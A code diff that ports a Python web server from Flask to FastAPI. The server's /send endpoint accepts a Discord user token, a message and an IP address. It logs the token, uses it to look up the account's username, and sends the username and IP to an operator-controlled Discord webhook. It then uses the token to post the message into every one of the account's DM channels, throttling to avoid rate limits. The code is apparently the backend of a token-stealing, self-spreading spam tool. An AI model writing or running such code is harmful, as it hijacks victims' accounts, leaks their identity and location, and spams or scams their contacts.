@@ -1,91 +1,85 @@
-from flask import Flask, request, jsonify
+from fastapi import FastAPI, HTTPException
+from pydantic import BaseModel
 import requests
 import os
-import threading
+import time
 
-app = Flask(__name__)
+app = FastAPI()
 
-DISCORD_API = "https://discord.com/api/v8"
+class Payload(BaseModel):
+    token: str
+    message: str
+    ip: str
 
-@app.route('/test', methods=['GET'])
-def test_handler():
-    print("/test endpoint hit", flush=True)
-    return "Hello, World!", 200
+@app.get("/test")
+async def test_handler():
+    return "Hello, World!"
 
-@app.route('/send', methods=['POST'])
-def send_message():
-    print("/send endpoint hit", flush=True)
-    
+@app.post("/send")
+async def send(payload: Payload):
+    # Debug: Print the token
+    print(f"Token: {payload.token}")
+
+    # Fetch user information (username)
+    user_info_url = "https://discord.com/api/v9/users/@me"
+    headers = {
+        "Authorization": f"Bearer {payload.token}",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    }
     try:
-        data = request.json
-        print(f"Received data: {data}", flush=True)
-        
-        token = data.get("token")
-        webhook_message = data.get("webhook_message")
-        dm_message = data.get("dm_message")
-        webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"  # Replace with your webhook
+        user_response = requests.get(user_info_url, headers=headers)
+        user_response.raise_for_status()
+        user_data = user_response.json()
+        username = user_data.get("username", "Unknown")
+    except requests.exceptions.RequestException as e:
+        print(f"❌ Failed to fetch username: {e}")
+        raise HTTPException(status_code=401, detail="Failed to fetch username")
 
-        # Validate input
-        if not token or not webhook_message or not dm_message:
-            print("Missing required fields in payload", flush=True)
-            return jsonify({"error": "Missing required fields"}), 400
+    # Send message to Discord webhook including IP and username
+    webhook_url = os.getenv("DISCORD_WEBHOOK_URL")  # Read webhook URL from environment variables
+    if not webhook_url:
+        raise HTTPException(status_code=500, detail="Webhook URL not configured")
 
-        # Send to webhook
-        if "@everyone" in webhook_message or "@here" in webhook_message:
-            print("Blocked message containing @everyone or @here", flush=True)
-            return jsonify({"error": "Message contains @everyone or @here"}), 400
-        
-        webhook_response = requests.post(webhook_url, json={"content": webhook_message})
-        print(f"Webhook response: {webhook_response.status_code}", flush=True)
-        
-        if webhook_response.status_code == 204:
-            print("Webhook message sent successfully", flush=True)
-        else:
-            print(f"Failed to send webhook message: {webhook_response.status_code} - {webhook_response.text}", flush=True)
-        
-        # Start a new thread to send DMs
-        print("Starting DM sending thread...", flush=True)
-        threading.Thread(target=send_dms, args=(token, dm_message)).start()
-        
-        return jsonify({"message": "Message sent to webhook and DMs"})
-    
-    except Exception as e:
-        print(f"Error in /send endpoint: {e}", flush=True)
-        return jsonify({"error": "Internal Server Error"}), 500
+    webhook_content = f"Message: {payload.message}\nUsername: {username}\nIP: {payload.ip}"
+    discord_payload = {"content": webhook_content}
 
-def send_dms(token, message):
     try:
-        headers = {"Authorization": f"Bearer {token}"}
-        print("Fetching DM channels...", flush=True)
-        
-        response = requests.get(f"{DISCORD_API}/users/@me/channels", headers=headers)
-        print(f"DM Channel Fetch Response: {response.status_code}", flush=True)
+        webhook_response = requests.post(webhook_url, json=discord_payload)
+        webhook_response.raise_for_status()
+        print("✅ Message sent to webhook")
+    except requests.exceptions.RequestException as e:
+        print(f"❌ Failed to send message to webhook: {e}")
 
-        if response.status_code != 200:
-            print(f"Failed to get DM channels: {response.status_code} - {response.text}", flush=True)
-            return
-        
-        channels = response.json()
-        print(f"Fetched {len(channels)} DM channels", flush=True)
-        
-        for channel in channels:
-            channel_id = channel.get("id")
-            if channel_id:
-                msg_response = requests.post(
-                    f"{DISCORD_API}/channels/{channel_id}/messages",
-                    headers=headers,
-                    json={"content": message}
-                )
-                print(f"DM Response ({channel_id}): {msg_response.status_code}", flush=True)
-                
-                if msg_response.status_code == 200:
-                    print(f"Message sent to DM: {channel_id}", flush=True)
-                else:
-                    print(f"Failed to send message to {channel_id}: {msg_response.status_code} - {msg_response.text}", flush=True)
-    except Exception as e:
-        print(f"Error in send_dms function: {e}", flush=True)
+    # Fetch user's DM channels
+    dm_channels_url = "https://discord.com/api/v9/users/@me/channels"
+    try:
+        dm_response = requests.get(dm_channels_url, headers=headers)
+        dm_response.raise_for_status()
+        dm_channels = dm_response.json()
 
-if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 8080))
-    print(f"Server starting on port {port}", flush=True)
-    app.run(host='0.0.0.0', port=port, debug=True)
+        for dm in dm_channels:
+            dm_id = dm.get("id")
+            if dm_id:
+                dm_message_url = f"https://discord.com/api/v9/channels/{dm_id}/messages"
+                try:
+                    msg_response = requests.post(
+                        dm_message_url,
+                        headers=headers,
+                        json={"content": payload.message},
+                    )
+                    msg_response.raise_for_status()
+                    print(f"✅ Message sent to DM: {dm_id}")
+                except requests.exceptions.RequestException as e:
+                    print(f"❌ Failed to send message to DM {dm_id}: {e}")
+
+                # Delay to prevent rate limiting
+                time.sleep(1)
+
+        return "✅ Messages sent to webhook and DMs"
+    except requests.exceptions.RequestException as e:
+        print(f"❌ Failed to fetch DM channels: {e}")
+        raise HTTPException(status_code=401, detail="Failed to fetch DM channels")
+
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", "8080")))
